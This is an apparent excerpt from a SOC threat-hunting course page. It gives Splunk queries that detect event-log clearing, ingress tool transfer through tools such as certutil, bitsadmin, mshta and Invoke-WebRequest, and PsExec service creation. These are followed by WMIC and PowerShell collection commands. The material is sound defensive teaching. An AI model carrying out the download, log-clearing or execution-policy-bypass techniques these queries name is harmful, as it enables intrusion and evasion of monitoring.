+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=13
+| where like(Image, "%\\reg.exe") OR like(Image, "%\\powershell.exe")
+| table _time, Computer, User, TargetObject, Details, Image, ProcessGuid
+| sort -_time</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+<li><a target="_blank" href="https://soc201.com/b1HKOV">Lookups (Splunk Documentation)</a></li>
+<li><a target="_blank" href="https://soc201.com/UjPuVu">Sysmon (Sysinternals)</a></li>
+<li><a target="_blank" href="https://soc201.com/attack">MITRE ATT&CK</a></li>
+</ul>
+
+<h1>Hunting Defense Evasion Artifacts</h1>
+
+<h4>Find all Event Log clearance events (Security EventID 1102)</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Security" EventID=1102</pre>
+</div>
+
+<h4>Show details of Event Log clearance events</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Security" EventID=1102
+| table _time, Computer, Channel, EventID, ClientProcessId, SubjectUserName, name</pre>
+</div>
+
+<h4>Show Sysmon process creation for ProcessId 3892</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1 ProcessId=3892
+| table _time host user Image CommandLine ParentImage ParentCommandLine IntegrityLevel</pre>
+</div>
+
+<h4>Show Sysmon process creation for ProcessId 3892 within specific time range</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1 ProcessId=3892 earliest="06/11/2025:22:30:45" latest="06/11/2025:22:30:55"
+| table _time, host, user, Image, CommandLine, ParentImage, ParentCommandLine, IntegrityLevel</pre>
+</div>
+
+<h4>Show System EventID 104 events</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:System" EventID=104
+| table _time, Computer, Channel, EventID, object, action</pre>
+</div>
+
+<h4>Find Sysmon executions of wevtutil.exe with /cl option</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index=aa15cbf9 source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1
+| search Image="*\\wevtutil.exe" AND CommandLine="*cl*"
+| table _time, Computer, User, Image, CommandLine, ParentImage
+| sort -_time</pre>
+</div>
+
+<h4>Find Security EventID 4688 for wevtutil.exe with /cl option</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index=aa15cbf9 source="XmlWinEventLog:Security" EventID=4688
+| search NewProcessName="*\\wevtutil.exe" AND CommandLine="*cl*"
+| table _time, Computer, SubjectUserName, NewProcessName, NewProcessId, CommandLine, ParentProcessName, ProcessId
+| sort -_time</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+<li><a target="_blank" href="https://soc201.com/attack">MITRE ATT&CK</a></li>
+<li><a target="_blank" href="https://soc201.com/XCinyZ">Windows Security Event ID 1102 (Microsoft)</a></li>
+</ul>
+
+<h1>Hunting C2: Ingress Tool Transfer (LOLBAS)</h1>
+
+<h4>Detect common download utilities accessing HTTP URLs</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1
+(
+  Image="*\\certutil.exe" 
+  OR Image="*\\bitsadmin.exe" 
+  OR Image="*\\curl.exe"
+  OR Image="*\\wget.exe"
+  OR Image="*\\finger.exe"
+  OR Image="*\\mshta.exe"
+  OR Image="*\\winget.exe"
+)
+AND CommandLine="*http*"
+| table _time, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine
+| sort -_time</pre>
+</div>
+
+<h4>Detect certutil.exe accessing HTTP URLs</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1
+Image="*\\certutil.exe" AND CommandLine="*http*"
+| table _time, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine
+| sort -_time</pre>
+</div>
+
+<h4>Detect certutil.exe using urlcache</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1
+Image="*\\certutil.exe" AND CommandLine="*urlcache*"
+| table _time, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine
+| sort -_time</pre>
+</div>
+
+<h4>Detect certutil.exe with urlcache or PowerShell download commands</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1
+(Image="*\\certutil.exe" AND CommandLine="*urlcache*")
+OR (Image="*\\powershell.exe" AND (CommandLine="*Invoke-WebRequest*" OR CommandLine="*iwr*" OR CommandLine="*Net.WebClient*"))
+| table _time, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine
+| sort -_time</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/attack">MITRE ATT&CK</a></li>
+  <li><a target="_blank" href="https://soc201.com/lolbas">The LOLBAS Project</a></li>
+</ul>
+
+<h1>Hunting C2: Ingress Tool Transfer (File System Events)</h1>
+
+<h4>Search for all Sysmon EventID 11 (File creation)</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=11</pre>
+</div>
+
+<h4>Show file creations in public, temp, or program data folders</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=11 
+(TargetFilename="C:\\Users\\Public\\*" OR TargetFilename="C:\\Windows\\Temp\\*" OR TargetFilename="C:\\ProgramData\\*")
+| table _time, Computer, User, TargetFilename, Image, ProcessId
+| sort -_time</pre>
+</div>
+
+<h4>Show .exe file creations in Windows folder</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=11 
+TargetFilename="C:\\Windows\\*.exe"
+| table _time, Computer, User, TargetFilename, Image, ProcessId
+| sort -_time</pre>
+</div>
+
+<h4>Count file creation events by process image</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=11 
+| stats count by Image</pre>
+</div>
+
+<h4>Filter file creation events by PowerShell executable</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=11 
+Image="C:\\WINDOWS\\*\\WindowsPowerShell\\v1.0\\powershell.exe"</pre>
+</div>
+
+<h4>Show PowerShell file creation details</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=11 
+Image="C:\\WINDOWS\\*\\WindowsPowerShell\\v1.0\\powershell.exe"
+| table _time, Computer, User, TargetFilename, Image, ProcessId
+| sort -_time</pre>
+</div>
+
+<h1>Hunting C2: Ingress Tool Transfer (Network Connection Events)</h1>
+
+<h4>Show all network connections from Sysmon EventID 3</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=3 
+| table _time, Computer, User, Image, SourceIp, SourcePort, DestinationIp, DestinationPort, Protocol
+| sort -_time</pre>
+</div>
+
+<h4>Show network connections including ProcessGuid</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=3 
+| table _time, Computer, User, Image, SourceIp, SourcePort, DestinationIp, DestinationPort, Protocol, ProcessGuid
+| sort -_time</pre>
+</div>
+
+<h4>Show details for a specific process creation by ProcessGuid</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1 ProcessGuid="{57bdb984-035a-684a-3e02-000000000f00}"
+| table _time host user Image CommandLine ParentImage ParentCommandLine IntegrityLevel
+| sort -_time</pre>
+</div>
+
+<h1>Hunting Lateral Movement: PsExec (Service Creation)</h1>
+
+<h4>Search for all Windows service creation events (System EventCode 7045)</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:System" EventCode=7045</pre>
+</div>
+
+<h4>Show details of Windows service creation events</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:System" EventCode=7045
+| table _time, Computer, AccountName, ServiceName, ImagePath, ServiceType, StartType</pre>
+</div>
+
+<h4>Show Sysmon registry changes for service ImagePath entries</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=13 TargetObject="HKLM\\System\\CurrentControlSet\\Services\\*\\ImagePath"
+| table _time, Computer, User, TargetObject, Details, Image, ProcessId
+| sort -_time</pre>
+</div>
+
+<h4>Aggregate Sysmon service registry changes by process image and computer</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=13 TargetObject="HKLM\\System\\CurrentControlSet\\Services\\*\\ImagePath"
+| stats values(TargetObject) as TargetObject, values(Details) as Details by Image, Computer</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/attack">MITRE ATT&CK</a></li>
+</ul>
+
+<h1>Hunting Lateral Movement: PsExec (Reversing Regex)</h1>
+
+<h4>Regex: Match exactly 4 letters</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>^[A-Za-z]{4}$</pre>
+</div>
+
+<h4>Regex: Match exactly 8 letters followed by .exe</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>^[A-Za-z]{8}\.exe$</pre>
+</div>
+
+
+<h4>Regex: Match 4-letter service names (System EventCode 7045)</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:System" EventCode=7045
+| regex ServiceName="^[A-Za-z]{4}$"
+| table _time, Computer, ServiceName, ImagePath, AccountName</pre>
+</div>
+
+<h4>Regex: Match 4-letter service registry keys (Sysmon EventID 13)</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=13
+| regex TargetObject="HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\[A-Za-z]{4}\\\\ImagePath"
+| table _time, Computer, User, TargetObject, Details, Image</pre>
+</div>
+
+<h4>Regex: Match 8-character executable names in service ImagePath (System EventCode 7045)</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:System" EventCode=7045
+| regex ImagePath=".*\\\\[A-Za-z]{8}\\.exe"
+| table _time, Computer, ServiceName, ImagePath, AccountName</pre>
+</div>
+
+<h4>Regex: Match 8-character executables in service registry ImagePath (Sysmon EventID 13)</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=13 TargetObject="HKLM\\System\\CurrentControlSet\\Services\\*\\ImagePath"
+| regex Details=".*\\\\[A-Za-z]{8}\\.exe"
+| table _time, Computer, User, TargetObject, Details, Image</pre>
+</div>
+
+<h4>Regex: Match 8-character executables in file creation (Sysmon EventID 11)</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=11
+| regex TargetFilename=".*\\\\[A-Za-z]{8}\\.exe"
+| table _time, Computer, User, TargetFilename, Image</pre>
+</div>
+
+<h4>Regex: Match 8-character executables in Windows folder (Sysmon EventID 11)</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=11 
+| regex TargetFilename="C:\\\\Windows\\\\[A-Za-z]{8}\\.exe"
+| table _time, Computer, User, TargetFilename, Image</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/4taM1L">The Pyramid of Pain (David Bianco)</a></li>
+  <li><a target="_blank" href="https://soc201.com/hQpPws">Impacket (Fortra, GitHub)</a></li>
+  <li><a target="_blank" href="https://soc201.com/EFWE69">Python String Operations</a></li>
+  <li><a target="_blank" href="https://soc201.com/regex101">Regex101</a></li>
+</ul>
+
+<h1>Hunting Lateral Movement: PsExec (Named Pipes)</h1>
+
+<h4>Hunt RemCom named pipe creation or connection</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" (EventID=17 OR EventID=18) 
+PipeName="*RemCom*"
+| table _time, Computer, User, EventID, EventType, PipeName, Image, ProcessId
+| sort -_time</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/vE6pAd">Threat Hunting for PsExec (Red Canary)</a></li>
+  <li><a target="_blank" href="https://soc201.com/hQpPws">Impacket (Fortra, GitHub)</a></li>
+</ul>
+
+
+<h1>Introduction to WMI</h1>
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/vbUorx">Windows Management Instrumentation (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/T0gPx9">WMIC (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/4r4XBK">Web-Based Enterprise Management (DMFT)</a></li>
+  <li><a target="_blank" href="https://soc201.com/48PCSv">Common Information Model (DMFT)</a></li>
+</ul>
+
+<h1>Collection with WMIC</h1>
+
+<h4>WMIC help</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>wmic /?</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>wmic process /?</pre>
+</div>
+
+<h4>List all startup applications</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>wmic startup list full</pre>
+</div>
+
+<h4>Export processes to a text file</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>wmic /output:"C:\Users\tcm\Documents\processes.txt" process get Name,ProcessId</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>type C:\Users\tcm\Documents\processes.txt</pre>
+</div>
+
+<h4>Export startup applications to a file</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>wmic /output:C:\Users\tcm\Documents\startup.txt startup list full</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>type C:\Users\tcm\Documents\startup.txt</pre>
+</div>
+
+<h4>List all services in full detail</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>wmic service list full</pre>
+</div>
+
+<h4>Get service name, path, start mode, and system name</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>wmic service get name,pathname,startmode,systemname</pre>
+</div>
+
+<h4>Export service details to CSV</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>wmic /output:C:\Users\tcm\Documents\services.csv service get name,pathname,startmode,systemname /format:csv</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>type C:\Users\tcm\Documents\services.csv</pre>
+</div>
+
+<h4>Export service details to HTML table</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>wmic /output:C:\Users\tcm\Documents\services.html service get name,pathname,startmode,systemname /format:htable</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>start C:\Users\tcm\Documents\services.html</pre>
+</div>
+
+<h4>List running processes with detailed info</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>wmic process get Name,ProcessId,ParentProcessId,ExecutablePath</pre>
+</div>
+
+<h4>Pull network configuration info</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>wmic nicconfig get description,ipaddress,macaddress</pre>
+</div>
+
+<h4>List startup applications</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>wmic startup list full</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>wmic service where (startmode="auto") get name,state</pre>
+</div>
+
+<h4>See currently logged-on users</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>wmic computersystem get username</pre>
+</div>
+
+<h4>Enumerate enabled local accounts</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>wmic useraccount where "Disabled=0 AND LocalAccount=1" get name</pre>
+</div>
+
+<h4>Find user-created shares</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>wmic share where "NOT name like '%$'" get name, path</pre>
+</div>
+
+<h4>List all processes not located in Windows folder</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>wmic process where "not ExecutablePath like '%Windows%'" get ExecutablePath</pre>
+</div>
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/vbUorx">Windows Management Instrumentation (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/T0gPx9">WMIC (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/ez">Timeline Explorer (Eric Zimmerman)</a></li>
+</ul>
+
+<h1>Remote Collection with WMIC</h1>
+
+<h4>Remote process enumeration</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>wmic /node:10.10.10.8 process get Name,ProcessId,ParentProcessId,ExecutablePath</pre>
+</div>
+
+<h4>Remote process enumeration by hostname</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>wmic /node:"WKS-4F1D" process get Name,ProcessId,ParentProcessId,ExecutablePath</pre>
+</div>
+
+<h4>Remote process enumeration using IP list file</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>echo "10.10.10.8" > C:\Users\tcm\Downloads\ips.txt</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>wmic /node:@C:\Users\tcm\Downloads\ips.txt process get Name,ProcessId,ParentProcessId,ExecutablePath</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/vbUorx">Windows Management Instrumentation (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/T0gPx9">WMIC (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/ez">Timeline Explorer (Eric Zimmerman)</a></li>
+</ul>
+
+<h1>Scripting WMI Collection</h1>
+
+<h4>Change directory to the lab folder</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>cd C:\Users\tcm\Desktop\Class_Files\labs\6baf3b7e</pre>
+</div>
+
+<h4>Create hosts.txt with one IP</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>echo "10.10.10.8" &gt; hosts.txt</pre>
+</div>
+
+<h4>Show contents of wmic_ex.ps1</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Content wmic_ex.ps1</pre>
+</div>
+
+<h4>Temporarily allow script execution in this PowerShell session</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Set-ExecutionPolicy Bypass -Scope Process -Force</pre>
+</div>
+
+<h4>Run the wmi_ex.ps1 script</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>.\wmi_ex.ps1</pre>
+</div>
+
+<h4>Run the wmi-object-ex.ps1 script</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Content .\wmi-object-ex.ps1</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>.\wmi-object-ex.ps1</pre>
+</div>
+
+<h4>Run the PoSh-R2.ps1 script</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>cd .\PoSh-R2\</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>.\PoSh-R2.ps1</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/vbUorx">Windows Management Instrumentation (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/T0gPx9">WMIC (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/ny6SGv">Get-WmiObject (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/ez">Timeline Explorer (Eric Zimmerman)</a></li>
+  <li><a target="_blank" href="https://soc201.com/U4iCFN">PowerShell Rapid Response - PoSh-R2 (WiredPulse)</a></li>
+</ul>
+
+
+<h1>PowerShell 101: Cmdlets</h1>
+
+<h4>List all running processes</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Process</pre>
+</div>
+
+<h4>Stop a Windows service</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Stop-Service</pre>
+</div>
+
+<h4>Change the system date and time</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Set-Date</pre>
+</div>
+
+<h4>Delete a file or folder</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Remove-Item</pre>
+</div>
+
+<h4>List all available commands</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Command</pre>
+</div>
+
+<h4>Display full help for Get-Process</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Help Get-Process -Full</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/uSyKRN">PowerShell Documentation (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/uXJJFU">Cmdlet Overview (Microsoft)</a></li>
+</ul>
+
+<h1>PowerShell 101: Aliases</h1>
+
+<h4>Show alias for Get-ChildItem</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Alias -Definition Get-ChildItem</pre>
+</div>
+
+<h4>Show alias for Invoke-WebRequest</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Alias -Definition Invoke-WebRequest</pre>
+</div>
+
+<h4>Show alias for Invoke-Expression</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Alias -Definition Invoke-Expression</pre>
+</div>
+
+<h4>Show alias for Get-Alias itself</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Alias -Definition Get-Alias</pre>
+</div>
+
+<h4>Show alias 'gci' (commonly Get-ChildItem)</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Alias gci</pre>
+</div>
+
+<h4>Show alias 'iwr' (commonly Invoke-WebRequest)</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>gal iwr</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/uSyKRN">PowerShell Documentation (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/uXJJFU">Cmdlet Overview (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/YM8999">About Aliases (Microsoft)</a></li>
+</ul>
+
+<h1>PowerShell 101: Objects and the Pipeline</h1>
+
+<h4>Show all properties and methods of processes</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Process | Get-Member</pre>
+</div>
+
+<h4>Filter processes where name is 'notepad'</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Process | Where-Object { $_.ProcessName -eq 'notepad' }</pre>
+</div>
+
+<h4>Get the 'notepad' process directly by name</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Process -Name notepad</pre>
+</div>
+
+<h4>Show alias for Where-Object</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Alias -Definition Where-Object</pre>
+</div>
+
+<h4>List services that start automatically</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Service | ? { $_.StartType -eq 'Automatic' }</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/uSyKRN">PowerShell Documentation (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/foS0An">Objects, Properties and Methods (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/RfVPhH">About Pipelines (Microsoft)</a></li>
+</ul>
+
+<h1>PowerShell 101: Selecting, Sorting, and Formatting</h1>
+
+<h4>Select Name and Id of all processes</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Process | Select-Object Name, Id</pre>
+</div>
+
+<h4>Select first 5 and last 5 processes by Name and Id</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Process | Select-Object Name, Id -First 5</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Process | Select-Object Name, Id -Last 5</pre>
+</div>
+
+<h4>List files in System32 sorted by size descending</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-ChildItem C:\Windows\System32 | Sort-Object Length -Descending</pre>
+</div>
+
+<h4>Top 5 largest files in System32</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-ChildItem C:\Windows\System32 | Sort-Object Length -Descending | Select-Object -First 5</pre>
+</div>
+
+<h4>Sort services by DisplayName</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Service | Sort-Object DisplayName</pre>
+</div>
+
+<h4>Get all scheduled tasks with info</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-ScheduledTask | Get-ScheduledTaskInfo</pre>
+</div>
+
+<h4>Sort scheduled tasks by LastRunTime descending</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-ScheduledTask | Get-ScheduledTaskInfo | Sort-Object LastRunTime -Descending</pre>
+</div>
+
+<h4>Top 5 most recently run scheduled tasks</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-ScheduledTask | Get-ScheduledTaskInfo | Sort-Object LastRunTime -Descending | Select-Object -First 5</pre>
+</div>
+
+<h4>Top 5 scheduled tasks showing only TaskName and LastRunTime</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
